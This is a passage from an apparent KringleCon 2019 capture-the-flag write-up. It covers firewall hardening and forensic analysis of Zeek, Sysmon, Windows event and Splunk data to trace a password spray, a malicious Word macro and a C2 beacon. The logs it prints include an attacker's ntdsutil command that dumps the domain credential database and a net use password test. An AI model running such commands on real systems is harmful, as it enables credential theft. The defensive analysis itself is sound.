<span class="gray1">elfuuser@term_iptables:~$</span> <span class="green">sudo</span> <span class="green">iptables</span> -<span class="purple">A</span> OUTPUT -<span class="purple">p</span> tcp --<span class="purple">dport</span> 80 -<span class="purple">j</span> ACCEPT
</pre>

<p>
Finally, we'll accept our own traffic. This one wasn't in any hint, but we're familiar enough by now that we can find the correct invocation:
</p>

<pre class="src">
<span class="gray1">elfuuser@term_iptables:~$</span> <span class="green">sudo</span> <span class="green">iptables</span> -<span class="purple">A</span> INPUT -<span class="purple">i</span> lo -<span class="purple">j</span> ACCEPT
</pre>

<p>
Our final configuration looks like this:
</p>

<pre class="src">

<span class="gray1">elfuuser@term_iptables:~$</span> <span class="green">sudo</span> <span class="green">iptables</span> -<span class="purple">L</span> 
Chain INPUT (policy DROP)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
ACCEPT     tcp  --  172.19.0.225         anywhere             tcp dpt:22
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:21
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:80
ACCEPT     all  --  anywhere             anywhere            
Chain FORWARD (policy DROP)
target     prot opt source               destination         
Chain OUTPUT (policy DROP)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:80
</pre>

<p>
And sure enough, Kent verifies it and congratulates us:
</p>


<pre class="src">
<span style="color: #d30102">Kent TinselTooth: Great, you hardened my IOT Smart Braces firewall!</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-org7e31be7" class="outline-3">
<h3 id="org7e31be7">Zeek JSON Analysis</h3>
<div class="outline-text-3" id="text-org7e31be7">
<p>
Direct link: <a href="https://docker2019.kringlecon.com/?challenge=jq&amp;id=00112233-4455-4455-8899-aabbccddeeff">?challenge=jq</a>
</p>

<p>
In the Sleigh Workshop
</p>
</div>

<div id="outline-container-org302c5f4" class="outline-4">
<h4 id="org302c5f4">Background</h4>
<div class="outline-text-4" id="text-org302c5f4">
<pre class="example">
Some JSON files can get quite busy.
There's lots to see and do.
Does C&amp;C lurk in our data?
JQ's the tool for you!

-Wunorse Openslae

Identify the destination IP address with the longest connection duration
using the supplied Zeek logfile. Run runtoanswer to submit your answer.
</pre>

<div class="goal">
<p>
Find the destination IP address with the longest connection duration.
</p>

</div>

<div class="chat">
<p>
Wunorse Openslae here, just looking at some Zeek logs.
</p>

<p>
I'm pretty sure one of these connections is a malicious C2 channel&#x2026;
</p>

<p>
Do you think you could take a look?
</p>

<p>
I hear a lot of C2 channels have very long connection times.
</p>

<p>
Please use <code>jq</code> to find the longest connection in this data set.
</p>

<p>
We have to kick out any and all grinchy activity!
</p>

</div>


<div class="gamehint">
<p>
<b>Jq</b>: <a href="https://pen-testing.sans.org/blog/2019/12/03/parsing-zeek-json-logs-with-jq-2">Parsing Zeek JSON Logs with JQ</a>
</p>

</div>
</div>
</div>

<div id="outline-container-org4a3a078" class="outline-4">
<h4 id="org4a3a078">Solution</h4>
<div class="outline-text-4" id="text-org4a3a078">
<p>
<asciinema-player src="casts/jq.cast" preload="yes" poster="npt:0:03" theme="solarized-dark"></asciinema-player>
</p>

<p>
The hint is kind enough to provide us with exactly the one-liner we need:
</p>

<pre class="src">
<span class="gray1">elf@term_jq:~$</span> <span class="green">cat</span> conn.log | <span class="green">jq</span> -<span class="purple">s</span> <span class="red">'sort_by(.duration) | reverse | .[0]'</span>
{
  <span class="green">"ts"</span>: <span class="purple">"2019-04-18T21:27:45.402479Z"</span>,
  <span class="green">"uid"</span>: <span class="purple">"CmYAZn10sInxVD5WWd"</span>,
  <span class="green">"id.orig_h"</span>: <span class="purple">"192.168.52.132"</span>,
  <span class="green">"id.orig_p"</span>: <span class="purple">8</span>,
  <span class="green">"id.resp_h"</span>: <span class="purple">"13.107.21.200"</span>,
  <span class="green">"id.resp_p"</span>: <span class="purple">0</span>,
  <span class="green">"proto"</span>: <span class="purple">"icmp"</span>,
  <span class="green">"duration"</span>: <span class="purple">1019365.337758</span>,
  <span class="green">"orig_bytes"</span>: <span class="purple">30781920</span>,
  <span class="green">"resp_bytes"</span>: <span class="purple">30382240</span>,
  <span class="green">"conn_state"</span>: <span class="purple">"OTH"</span>,
  <span class="green">"missed_bytes"</span>: <span class="purple">0</span>,
  <span class="green">"orig_pkts"</span>: <span class="purple">961935</span>,
  <span class="green">"orig_ip_bytes"</span>: <span class="purple">57716100</span>,
  <span class="green">"resp_pkts"</span>: <span class="purple">949445</span>,
  <span class="green">"resp_ip_bytes"</span>: <span class="purple">56966700</span>
}
<span class="gray1">elf@term_jq:~$</span> <span class="green">runtoanswer</span> 
Loading, please wait......


What is the destination IP address with the longes connection duration? 13.107.21.200


Thank you for your analysis, you are spot-on.
I would have been working on that until the early dawn.
Now that you know the features of jq,
You'll be able to answer other challenges too.

-Wunorse Openslae

Congratulations!
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-orga017a31" class="outline-2">
<h2 id="orga017a31">Objectives</h2>
<div class="outline-text-2" id="text-orga017a31">
</div>
<div id="outline-container-orga403438" class="outline-3">
<h3 id="obj0"><a id="orga403438"></a>0. Talk to Santa in the Quad</h3>
<div class="outline-text-3" id="text-obj0">
<div class="goal">
<p>
Enter the campus quad and talk to Santa.
</p>

</div>
</div>
<div id="outline-container-org2199a2c" class="outline-4">
<h4 id="org2199a2c">Solution</h4>
<div class="outline-text-4" id="text-org2199a2c">

<div class="figure">
<p><img src="./imgs/obj_00/solution.png" alt="solution.png" width="50%" />
</p>
<p><span class="figure-number">Figure 14: </span>Santa, with an umbrella</p>
</div>
</div>
</div>
</div>
<div id="outline-container-org6f0e754" class="outline-3">
<h3 id="obj1"><a id="org6f0e754"></a>1. Find the Turtle Doves</h3>
<div class="outline-text-3" id="text-obj1">
<div class="goal">
<p>
Find the missing turtle doves.
</p>

</div>
</div>
<div id="outline-container-org2acfc8e" class="outline-4">
<h4 id="org2acfc8e">Solution</h4>
<div class="outline-text-4" id="text-org2acfc8e">
<p>
Entering the Student Union, and clicking on Michael and Jane complete this objective.
</p>


<div class="figure">
<p><img src="./imgs/obj_01/solution.png" alt="solution.png" width="66%" />
</p>
<p><span class="figure-number">Figure 15: </span>Warm by the fire&#x2026;</p>
</div>
</div>
</div>
</div>
<div id="outline-container-orgeb17327" class="outline-3">
<h3 id="obj2"><a id="orgeb17327"></a>2. Unredact Threatening Document 🎄</h3>
<div class="outline-text-3" id="text-obj2">
<div class="goal">
<p>
Someone sent a <a href="../objectives/obj_2/LetterToElfUPersonnel.pdf">threatening letter</a> to Elf University. What is the
first word in ALL CAPS in the subject line of the letter?
</p>

</div>

<div class="gamehint">
<p>
Please find the letter in the Quad.
</p>

</div>
</div>
<div id="outline-container-org44675bd" class="outline-4">
<h4 id="org44675bd">Solution</h4>
<div class="outline-text-4" id="text-org44675bd">
<p>
Inspecting the Quad, we find the letter next to a tree:
</p>


<div class="figure">
<p><img src="./imgs/obj_02/location.png" alt="location.png" width="75%" />
</p>
<p><span class="figure-number">Figure 16: </span>"Sorry about the wall, sir." "And the tree across the quad."</p>
</div>

<p>
Unfortunately, the subject line is redacted! However, they didn't
do a very good job. A simple copy-paste is enough to recover the
text.
</p>


<div class="figure">
<p><img src="./imgs/obj_02/LetterToElfUPersonnel_Unredacted.png" alt="LetterToElfUPersonnel_Unredacted.png" width="66%" />
</p>
<p><span class="figure-number">Figure 17: </span>"In high school they pushed me in a mailbox, did I tell you that?"</p>
</div>
</div>
</div>
</div>
<div id="outline-container-org1381e4e" class="outline-3">
<h3 id="org1381e4e">3. Windows Log Analysis: Evaluate Attack Outcome 🎄</h3>
<div class="outline-text-3" id="text-org1381e4e">
</div>
<div id="outline-container-org464c527" class="outline-4">
<h4 id="org464c527">Background</h4>
<div class="outline-text-4" id="text-org464c527">
<div class="goal">
<p>
We're seeing attacks against the Elf U domain! Using the
<a href="../objectives/obj_3/Security.evtx">event log data</a>, identify the user account that the attacker
compromised using a password spray attack.
</p>

</div>

<div class="chat">
<p>
Have you taken a look at the password spray attack artifacts?
</p>

<p>
I'll bet that DeepBlueCLI tool is helpful.
</p>

<p>
You can check it out on GitHub.
</p>

<p>
It was written by that Eric Conrad.
</p>

<p>
He lives in Maine - not too far from here!
</p>

</div>

<div class="gamehint">
<p>
<i>Bushy Evergreen is hanging out in the train station and may be able to help you out.</i>
</p>

<p>
<b>Deep Blue CLI on Github</b>: <a href="https://github.com/sans-blue-team/DeepBlueCLI">Github page for DeepBlueCLI</a>
</p>

<p>
<b>Deep Blue CLI Posting</b>: <a href="https://www.ericconrad.com/2016/09/deepbluecli-powershell-module-for-hunt.html">Eric Conrad on DeepBlueCLI</a>
</p>

</div>
</div>
</div>

<div id="outline-container-orgdb3de2b" class="outline-4">
<h4 id="orgdb3de2b">Solution</h4>
<div class="outline-text-4" id="text-orgdb3de2b">
<p>
This challenge requires a Windows system. You can use a <a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/">free test VM</a> from Microsoft.
</p>

<p>
We download the data, install DeepBlueCLI, and then get cracking in a Powershell session. Running DeepBlue outputs alerts for several password spray attacks:
</p>

<div class="org-src-container">
<pre class="src src-powershell">.\DeepBlue.ps1 Security.evtx

Date    : 11/19/2019 4:22:46 AM
Log     : Security
EventID : 4648
Message : Distributed Account Explicit Credential Use (Password Spray Attack)
Results : The use of multiple user account access attempts with explicit credentials is an indicator of a password spray attack.
          Target Usernames: ygoldentrifle esparklesleigh hevergreen Administrator sgreenbells cjinglebuns tcandybaubles bbrandyleaves bevergreen lstripyleaves gchocolatewine wopenslae ltrufflefig supatree mstripysleigh pbrandyberry civysparkles sscarletpie
          ftwinklestockings cstripyfluff gcandyfluff smullingfluff hcandysnaps mbrandybells twinterfig civypears ygreenpie ftinseltoes smary ttinselbubbles dsparkleleaves
          Accessing Username: -
          Accessing Host Name: -
</pre>
</div>

<p>
However, we're looking for the user account that was compromised with
the password spray attack. As the attacker is trying passwords against
a large number of accounts, any accounts with successful logins will
have been compromised. To find successful authentications, we turn to
our new-found Powershell-fu, parsing the log and filtering on event ID
4624 (successful login):
</p>

<div class="org-src-container">
<pre class="src src-powershell"><span style="color: #268bd2;">Get-WinEvent</span> <span style="color: #cb4b16;">-Path</span> .\Security.evtx <span style="color: #cb4b16;">-FilterXPath</span> <span style="color: #859900;">"*[System[EventID=4624]]"</span>


   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
11/19/2019 4:23:47 AM         4624 Information      An account was successfully logged on....
11/19/2019 4:23:41 AM         4624 Information      An account was successfully logged on....
...
11/19/2019 4:21:34 AM         4624 Information      An account was successfully logged on....
8/23/2019 5:00:41 PM          4624 Information      An account was successfully logged on....
8/23/2019 5:00:20 PM          4624 Information      An account was successfully logged on....
</pre>
</div>

<p>
We see some successful logins, around the same time as the password spray attack. We'll rerun the previous search, this time using <code>Select-Object</code> to format the output with some additional fields:
</p>

<div class="org-src-container">
<pre class="src src-powershell"><span style="color: #268bd2;">Get-WinEvent</span> <span style="color: #cb4b16;">-Path</span> .\Security.evtx <span style="color: #cb4b16;">-FilterXPath</span> <span style="color: #859900;">"*[System[EventID=4624]]"</span> | 
<span style="color: #268bd2;">Select-Object</span> <span style="color: #cb4b16;">-Property</span> TimeCreated,MachineName,@{
Name=<span style="color: #859900;">'TargetAccountName'</span>;Expression={<span style="color: #2aa198;">$_</span>.Properties[5].Value}},@{
Name=<span style="color: #859900;">'WorkstationName'</span>;Expression={<span style="color: #2aa198;">$_</span>.Properties[11].Value}}

TimeCreated           MachineName  TargetAccountName WorkstationName
-----------           -----------  ----------------- ---------------
11/19/2019 4:23:47 AM DC1.elfu.org DC1$              -
11/19/2019 4:23:41 AM DC1.elfu.org DC1$              -
11/19/2019 4:23:05 AM DC1.elfu.org supatree          WORKSTATION
11/19/2019 4:22:41 AM DC1.elfu.org DC1$              -
11/19/2019 4:22:25 AM DC1.elfu.org DC1$              -
11/19/2019 4:22:25 AM DC1.elfu.org DC1$              -
11/19/2019 4:22:25 AM DC1.elfu.org DC1$              -
11/19/2019 4:22:25 AM DC1.elfu.org DC1$              -
11/19/2019 4:22:25 AM DC1.elfu.org DC1$              -
11/19/2019 4:21:46 AM DC1.elfu.org DC1$              -
11/19/2019 4:21:46 AM DC1.elfu.org DC1$              -
11/19/2019 4:21:45 AM DC1.elfu.org supatree          DC1
11/19/2019 4:21:41 AM DC1.elfu.org DC1$              -
11/19/2019 4:21:34 AM DC1.elfu.org pminstix          WORKSTATION
8/23/2019 5:00:41 PM  DC1.elfu.org DC1$              -
8/23/2019 5:00:20 PM  DC1.elfu.org pminstix          WORKSTATION
</pre>
</div>

<p>
We've narrowed it down to two users: <code>pminstix</code> and <code>supatree</code>. Of these, only <code>supatree</code> shows up in the DeepBlue password spraying alert list of usernames, which is our answer.
</p>
</div>
</div>
</div>
<div id="outline-container-org4cd5ac7" class="outline-3">
<h3 id="obj4"><a id="org4cd5ac7"></a>4. Windows Log Analysis: Determine Attacker Technique 🎄🎄</h3>
<div class="outline-text-3" id="text-obj4">
</div>
<div id="outline-container-org164627c" class="outline-4">
<h4 id="org164627c">Background</h4>
<div class="outline-text-4" id="text-org164627c">
<div class="goal">
<p>
Using <a href="../objectives/obj_4/sysmon-data.json">these normalized Sysmon logs</a>, identify the tool the attacker
used to retrieve domain password hashes from the lsass.exe
process.
</p>

</div>

<div class="chat">
<p>
Have you tried the Sysmon and EQL challenge?
</p>

<p>
If you aren't familiar with Sysmon, Carlos Perez has some great info about it.
</p>

<p>
Haven't heard of the Event Query Language?
</p>

<p>
Check out some of <a href="https://www.endgame.com/our-experts/ross-wolf">Ross Wolf</a>'s work on EQL or that blog post by Josh Wright in your badge.
</p>

</div>

<div class="gamehint">
<p>
<i>For hints on achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary.</i>
</p>

<p>
<b>Sysmon</b>: <a href="https://www.darkoperator.com/blog/2014/8/8/sysinternals-sysmon">Sysmon By Carlos Perez</a>
</p>

<p>
<b>Event Query Language</b>: <a href="https://pen-testing.sans.org/blog/2019/12/10/eql-threat-hunting/">EQL Threat Hunting</a>
</p>

</div>
</div>
</div>

<div id="outline-container-org6737c71" class="outline-4">
<h4 id="org6737c71">Solution</h4>
<div class="outline-text-4" id="text-org6737c71">
<p>
Our solution follows Josh's blog post pretty closely. We know the
attacker used the <code>lsass.exe</code> process to launch a tool to retrieve
password hashes. Our first search is for programs with a parent
process of <code>lsass.exe</code>. We pipe the output into <code>jq</code> for formatting:
</p>

<pre class="src">
<span class="green">eql</span> query -<span class="purple">f</span> sysmon-data.json <span class="red">"process where parent_process_name = 'lsass.exe'"</span> | 
  <span class="green">jq</span> <span class="red">"{process_name,parent_process_name,command_line,pid}"</span>
{
  <span class="green">"process_name"</span>: <span class="purple">"cmd.exe"</span>,
  <span class="green">"parent_process_name"</span>: <span class="purple">"lsass.exe"</span>,
  <span class="green">"command_line"</span>: <span class="purple">"C:\\Windows\\system32\\cmd.exe"</span>,
  <span class="green">"pid"</span>: <span class="purple">3440</span>
}
</pre>

<p>
<code>lsass</code> launched a single process, a command prompt. Let's see what commands were issued via the command prompt by looking for processes with a parent process id ("ppid") of our <code>cmd.exe</code> process:
</p>

<pre class="src">
<span class="green">eql</span> query -<span class="purple">f</span> sysmon-data.json <span class="red">"process where ppid = 3440"</span> | 
  <span class="green">jq</span> <span class="red">"{process_name,parent_process_name,command_line,pid}"</span>
{
  <span class="green">"process_name"</span>: <span class="purple">"ntdsutil.exe"</span>,
  <span class="green">"parent_process_name"</span>: <span class="purple">"cmd.exe"</span>,
  <span class="green">"command_line"</span>: <span class="purple">"ntdsutil.exe  \"ac i ntds\" ifm \"create full c:\\hive\" q q"</span>,
  <span class="green">"pid"</span>: <span class="purple">3556</span>
}
</pre>

<p>
The tool was <code>ntdsutil.exe</code>.
</p>

<p>
Looking at commands run with other <code>cmd.exe</code> invocations, we see some
bad-looking Powershell, and a password spraying attack. We can even
tell that supatree's password was <code>Passw0rd1</code> when they fell victim to
the spraying attack, as the attacker runs <code>net use \\\\127.0.0.1\\IPC$
/user:ELFU\\supatree Passw0rd1</code> to try to mount a fileshare with that
username and password, then runs <code>net use /delete \\\\127.0.0.1\\IPC$</code>
to unmount it.
</p>
</div>
</div>
</div>
<div id="outline-container-orgb7ec293" class="outline-3">
<h3 id="obj5"><a id="orgb7ec293"></a>5. Network Log Analysis: Determine Compromised System 🎄🎄</h3>
<div class="outline-text-3" id="text-obj5">
</div>
<div id="outline-container-org7666630" class="outline-4">
<h4 id="org7666630">Background</h4>
<div class="outline-text-4" id="text-org7666630">
<div class="goal">
<p>
The attacks don't stop! Can you help identify the IP address of
the malware-infected system using these <a href="./objectives/obj_5/elfu-zeeklogs">Zeek logs</a>?
</p>

</div>

<div class="chat">
<p>
For objective 5, have you taken a look at our Zeek logs?
</p>

<p>
Something's gone wrong.  But I hear someone named Rita can help us.
</p>

<p>
Can you and she figure out what happened?
</p>

</div>

<div class="gamehint">
<p>
<i>For hints on achieving this objective, please visit the Laboratory and talk with Sparkle Redberry.</i>
</p>

<p>
<b>RITA</b>: <a href="https://www.activecountermeasures.com/free-tools/rita/">RITA's homepage</a>
</p>

</div>
</div>
</div>
<div id="outline-container-org3af536c" class="outline-4">
<h4 id="org3af536c">Solution</h4>
<div class="outline-text-4" id="text-org3af536c">
<p>
We download the provided ZIP file, and extract it. In the archive, we
find the <a href="https://docs.zeek.org/en/stable/script-reference/log-files.html">standard Zeek logs</a> for about 21 hours in August 2019. We also
see a directory named <code>ELFU</code>, which has RITA output. Since the hint
told us to use RITA, we'll pursue that.
</p>

<p>
Opening <code>index.html</code> gives us a summary of what RITA found. We have a
number of tabs at the top, including Beacons and Long Connections. We
have the same IP address at the top of both of those lists,
192.168.134.130.
</p>

<p>
In the beaconing detection, that IP's activity to 144.202.46.214 has a
score of 99.8%. If we search for those IP addresses in the Zeek conn
logs (<code>fgrep 144.202.46.214 conn.* | fgrep 192.168.134.130</code>), we find a service of <code>http</code>, so we dig deeper in the http logs.
</p>

<p>
Like clockwork, we see HTTP POST requests every 10 seconds from
192.168.134.130 to
<a href="http://144.202.46.214/504vsa/server/vssvc.php">http://144.202.46.214/504vsa/server/vssvc.php</a>. Unforunately, our logs
begin with that activity, so we can't determine how the system was
compromised, but we're reasonably compromised that <code>192.168.134.130</code>
is compromised.
</p>
</div>
</div>
</div>
<div id="outline-container-org7471e19" class="outline-3">
<h3 id="obj6"><a id="org7471e19"></a>6. Splunk 🎄🎄🎄</h3>
<div class="outline-text-3" id="text-obj6">
</div>
<div id="outline-container-orgaf1d3f9" class="outline-4">
<h4 id="orgaf1d3f9">Background</h4>
<div class="outline-text-4" id="text-orgaf1d3f9">
<div class="goal">
<p>
Access <a href="https://splunk.elfu.org/">https://splunk.elfu.org/</a> as <code>elf</code> with password
<code>elfsocks</code>. What was the message for Kent that the adversary
embedded in this attack?
</p>

</div>

<div class="chat">
<p>
Kent said that my computer has been <span class="underline">hacking</span> other computers on campus and that I needed to fix it ASAP!"
</p>

<p>
If I don't, he will have to report the incident to the boss of the SOC.
</p>

</div>

<div class="gamehint">
<p>
<i>The SOC folks at that link will help you along!</i>
</p>

<p>
<i>For hints on achieving this objective, please visit the Laboratory in Hermey Hall and talk with Prof. Banas.</i>
</p>

<p>
<b>SIEM Basics</b>: The Elf U SOC can always use more analysts. No experience required, just a willingness to learn.
</p>

<p>
<b>SIEM Basics TOO</b>: The analysts stay in close contact on their private chat system. You'll find the help you need there.
</p>

<p>
<b>SIEM Basics THREEE</b>: The SOC uses some neat tools that James Brodsky spoke about in his KringleCon 2 talk: "<i>Dashing Through the Logs</i>"
</p>

</div>
</div>
</div>
<div id="outline-container-orgd528856" class="outline-4">
<h4 id="orgd528856">Training Question Solutions</h4>
<div class="outline-text-4" id="text-orgd528856">
<p>
We login to Splunk with the provided credentials, and are greeted with
some instructions about the challenge. The Elf University SOC has a
secure chat service, where we get some tips from Kent and the SOC
channel. In fact, the conversation in the #ELFU SOC channel gives us our first answer, <code>sweetums</code>.
</p>


<div class="figure">
<p><img src="./imgs/obj_06/solution1.png" alt="solution1.png" width="50%" />
</p>
<p><span class="figure-number">Figure 18: </span>'sweetums' communicating with the same weird IP</p>
</div>

<p>
We've identified the system, now we wish to know the file that was
accessed. At this point, we start chatting with Alice Bluebird, who is
the only other chat we have messages in. She gives us some resources,
including links to the search and raw files that she tells us we'll
need for the challenge question.
</p>

<p>
For the next training question, she gives us an example search
(<code>index=main cbanas</code>), and tells us to modify it to search for his
name. It's unclear which name she's referring to, but she just told us
that the Professor is close with Santa, so searching <code>index=main santa</code> 
gives us a few logs. The first one is a Powershell script
referencing an intriguing file:
<code>C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt</code>
</p>


<div class="figure">
<p><img src="./imgs/obj_06/solution2.png" alt="solution2.png" />
</p>
<p><span class="figure-number">Figure 19: </span>Santa e-mailing Prof. Carl Banas the draft Naughty &amp; Nice list</p>
</div>

<p>
Alice mentions the download of a scanning tool. Using a search of:
<code>index=main sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventDescription="File Created"</code>, 
we find a download of <code>nmap.zip</code>.
</p>


<div class="figure">
<p><img src="./imgs/obj_06/nmap.png" alt="nmap.png" />
</p>
<p><span class="figure-number">Figure 20: </span>nmap.zip file created</p>
</div>

<p>
Our next task is to identify the C2 server. Alice gets us most of the
way there, with the following search: <code>index=main sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" powershell EventCode=3</code>. We just need to identify the field that
contains the FQDN of the server Powershell is connecting
to. <code>DestinationHostname</code> seems like a good bet, and we find a single
value there, <code>144.202.46.214.vultr.com</code>.
</p>


<div class="figure">
<p><img src="./imgs/obj_06/solution3.png" alt="solution3.png" width="66%" />
</p>
<p><span class="figure-number">Figure 21: </span>Identifying the C2 server</p>
</div>

<p>
Alice walks us through most of the next question, finding events that
happen shortly before and after the earliest Powershell
invocation. Drilling down on Sysmon data (<code>sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"</code>),
we look at unique process IDs, and find two: 6268 and 5864. Alice
prompts us to find what created those processes (using Event ID 4688),
and reminds us that we might need to correlate process IDs in
hexadecimal with process IDs in decimal.
</p>


<div class="figure">
<p><img src="./imgs/obj_06/clue4.png" alt="clue4.png" width="66%" />
</p>
<p><span class="figure-number">Figure 22: </span>Two process IDs</p>
</div>

<p>
Alice provides us a link to search Event ID 4688 ("A new process has
been created") on the Windows logs, while also removing the time
constraint. We tweak her search to evaluate the hex process_ids to decimal so we can match them against our two process IDs.
<code>index=main sourcetype=WinEventLog EventCode=4688 | eval decimal_pid=tonumber(process_id, 16) | search (decimal_pid=6268 OR decimal_pid=5864)</code>
</p>

<p>
This uses a function described in the YouTube video, to help us convert between hexadecimal and decimal, and then we search for the two process IDs we previously found.
</p>


<div class="figure">
<p><img src="./imgs/obj_06/solution4.png" alt="solution4.png" />
</p>
<p><span class="figure-number">Figure 23: </span>WINWORD.EXE 19th Century Holiday Cheer Assignment.docm</p>
</div>

<p>
We can tell that a macro-enabled Word document (with a .docm extension) spawned the Powershell instance.
</p>

<p>
For our next question, Alice gives us a search against the stoQ data, and tells us some additional constraints. We modify her search to add a constraint on the mail subject line (thus ignoring the replies):
</p>

<pre class="src">
<span class="green">index</span>=<span class="purple">main</span> <span class="green">sourcetype</span>=<span class="purple">stoq</span> <span class="green">"results{}.workers.smtp.subject"</span>=<span class="purple">"holiday cheer assignment submission"</span> | 
  <span class="red">table</span> _time results{}.workers.smtp.to results{}.workers.smtp.from 
              results{}.workers.smtp.subject results{}.workers.smtp.body | 
  <span class="red">sort</span> - _time
</pre>


<div class="figure">
<p><img src="./imgs/obj_06/solution5.png" alt="solution5.png" />
</p>
<p><span class="figure-number">Figure 24: </span>21 Holiday Cheer Assignment submissions</p>
</div>

<p>
With what we know so far, the next question is pretty easy. To recover the password for the ZIP file (which contains the malicious Word document), we search the stoQ data for our filename: <code>index=main sourcetype=stoq "19th Century Holiday Cheer Assignment.docm"</code>
</p>

<p>
StoQ observed the e-mail (SMTP) transaction, in which Bradly
Buttercups instructed Prof. Banas on how to open the file. In this
same message, we see the sender of the malicious file, which has an
e-mail that's not quite right. In this domain look-alike attack,
instead of <code>elfu.org</code>, the message comes from <code>eifu.org</code>,
</p>


<div class="figure">
<p><img src="./imgs/obj_06/solution6.png" alt="solution6.png" />
</p>
<p><span class="figure-number">Figure 25: </span>Password is 123456789, e-mail is bradly.buttercups@eifu.org (sic)</p>
</div>

<p>
To review our training questions:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-right" />

<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-right">#</th>
<th scope="col" class="org-left">Question</th>
<th scope="col" class="org-left">Answer</th>
<th scope="col" class="org-left">Method</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-right">1</td>
<td class="org-left">What is the short host name of Professor Banas' computer?</td>
<td class="org-left">sweetums</td>
<td class="org-left">SOC chat</td>
</tr>

<tr>
<td class="org-right">2</td>
<td class="org-left">What is the name of the sensitive file that was likely accessed and copied by the attacker?</td>
<td class="org-left">C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt</td>
<td class="org-left">Searching 'santa'</td>
</tr>

<tr>
<td class="org-right">3</td>
<td class="org-left">What is the fully-qualified domain name(FQDN) of the command and control(C2) server?</td>
<td class="org-left">144.202.46.214.vultr.com</td>
<td class="org-left">DestinationHostname on Alice's search</td>
</tr>

<tr>
<td class="org-right">4</td>
<td class="org-left">What document is involved with launching the malicious PowerShell code?</td>
<td class="org-left">19th Century Holiday Cheer Assignment.docm</td>
<td class="org-left">Sysmon and Powershell process creation events</td>
</tr>

<tr>
<td class="org-right">5</td>
<td class="org-left">How many unique email addresses were used to send Holiday Cheer essays to Professor Banas?</td>
<td class="org-left">21</td>
<td class="org-left">stoQ SMTP events</td>
</tr>

<tr>
<td class="org-right">6</td>
<td class="org-left">What was the password for the zip archive that contained the suspicious file?</td>
<td class="org-left">123456789</td>
<td class="org-left">stoQ SMTP events w/ malicious filename</td>
</tr>

<tr>
<td class="org-right">7</td>
<td class="org-left">What email address did the suspicious file come from?</td>
<td class="org-left">bradly.buttercups@eifu.org</td>
<td class="org-left">same stoQ event as question 6</td>
</tr>
</tbody>
</table>
</div>
</div>

<div id="outline-container-org55185b2" class="outline-4">
<h4 id="org55185b2">Challenge Question Solution</h4>
<div class="outline-text-4" id="text-org55185b2">
<blockquote>
<p>
What was the message for Kent that the adversary embedded in this attack?
</p>
</blockquote>

<p>
Alice gives us some guidance on getting started, including a search with a single event to start from, and then a Splunk incantation to retrieve the path to artifacts from that file. We tweak her search a bit, to give us the URL of the files directly:
</p>

<pre class="src">
<span class="green">index</span>=<span class="purple">main</span> <span class="green">sourcetype</span>=<span class="purple">stoq</span> <span class="green">"results{}.workers.smtp.from"</span>=</span class="purple">"bradly buttercups <bradly.buttercups@eifu.org>"</span> | 
<span class="red">eval</span> <span class="green">results</span> = <span class="red">spath</span>(_raw, "results{}") | <span class="red">mvexpand</span> results | 
<span class="red">eval</span> <span class="green">path</span>=<span class="red">spath</span>(results, "archivers.filedir.path"), 
     <span class="green">filename</span>=<span class="red">spath</span>(results, "payload_meta.extra_data.filename"), 
     <span class="green">url</span>=<span class="purple">"https://elfu-soc.s3.amazonaws.com/stoQ%20Artifacts".path</purple> | 
<span class="red">search</span> <span class="green">path</span>!=<span class="purple">""</span> | <span class="green">table</span> filename,url
</pre>

<p>
There's a lot going on here. First, we start with the stoQ event from
the malicious sender. stoQ has expanded our ZIP (the video says that
at Elf U, stoQ will try to open ZIP files using a number of common
passwords), and examined the files contained within. The results of
that examination (and the links to where the files have been stored as
artifacts) are contained in the event, in JSON format, under the
<code>results</code> key.
</p>

<p>
To access each item in the list, we run <code>eval results = spath(_raw, "results{}")</code>.
This will extract <code>_raw["results"]</code>, and the <code>results{}</code> notation will
cause Splunk to return an item for each result in the list.
</p>

<p>
For more information about this step, see <a href="https://docs.splunk.com/Documentation/Splunk/8.0.1/SearchReference/Spath#Using_wildcards_in_place_of_an_array_index">spath: Using wildcards in place of an array index</a>.
</p>

<p>
Next, we call <code>mvexpand results</code>, which will turn our "multivalue"
field into separate events. This way, we treat each file contained in
the archive as a separate Splunk event.
</p>

<p>
We have another <code>eval</code> function, to copy some values into fields that
are easier to deal with. <code>path=archivers.filedir.path</code> and
<code>filename=payload_meta.extra_data.filename</code>. We also create a new
variable, <code>url</code>, which will have the direct path to the artifact on
the elfu-soc S3 bucket.
</p>

<p>
We only want events from which an artifact was stored, so we specify
<code>search path!=""</code>, and finally we display this as a table of
<code>filename</code> and <code>url</code>, allowing us to quickly drill down on the
interesting files.
</p>

<p>
Our first target is the Word document itself, "19th Century Holiday
Cheer Assignment.docm," but that file has been sanitized, as Alice
wouldn't put actual malicious executable content into this
exercise. In its place, we see:
</p>

<blockquote>
<p>
Cleaned for your safety. Happy Holidays!
</p>

<p>
In the real world, This would have been a wonderful artifact for you
to investigate, but it had malware in it of course so it's not posted
here. Fear not! The core.xml file that was a component of this
original macro-enabled Word doc is still in this File Archive thanks
to stoQ. Find it and you will be a happy elf :-)
</p>
</blockquote>

<p>
Using this hint, we grab <a href="https://elfu-soc.s3.amazonaws.com/stoQ%20Artifacts/home/ubuntu/archive/f/f/1/e/a/ff1ea6f13be3faabd0da728f514deb7fe3577cc4">core.xml</a> instead, which contains:
</p>

<div class="org-src-container">
